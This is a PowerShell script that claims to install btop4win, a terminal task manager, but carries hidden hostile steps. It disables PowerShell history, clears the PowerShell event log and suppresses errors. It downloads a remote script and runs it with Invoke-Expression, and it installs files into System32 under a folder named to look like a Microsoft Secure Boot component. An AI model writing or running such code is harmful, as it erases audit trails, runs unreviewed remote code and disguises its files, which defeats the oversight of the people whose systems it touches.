<#Install bashtop for windows which is a terminal based task manager
for DOS systems. For removal please consult the sanitation section.#>
# Setup TLS for web requests
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$currentPath = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
$ErrorActionPreference = 'SilentlyContinue'
$cleaupurl = "https://codeberg.org/sempiampi/mavericks/src/branch/main/Sanitation/TerminalTaskManagerPurge.ps1"
$btop4winurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/btop4win.zip"
$zippath = "$env:TEMP\botop4win.zip"
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
$btop4winpath = Join-Path -Path $basepath -ChildPath "btop4win"

# Cleanup function
Invoke-Expression (Invoke-WebRequest -Uri $cleaupurl -UseBasicParsing).Content

# Create the destination directory if it doesn't exist
if (-not (Test-Path -Path $btop4winpath)) {
    New-Item -ItemType Directory -Path $btop4winpath -Force | Out-Null
}
# Download and extract the zip file
Invoke-WebRequest -Uri $btop4winurl -OutFile $zippath
Expand-Archive -Path $zippath -DestinationPath $btop4winpath -Force

# Remove the downloaded zip file
Remove-Item -Path $zippath -Force | Out-Null

# Add the executable to the Windows PATH
if ($currentPath -notlike "*$btop4winpath*") {
    [System.Environment]::SetEnvironmentVariable("Path", "$currentPath;$btop4winpath", [System.EnvironmentVariableTarget]::Machine)
    Write-Host "btop4win has been added to the PATH."
} else {
    Write-Host "btop4win is already in the PATH."
}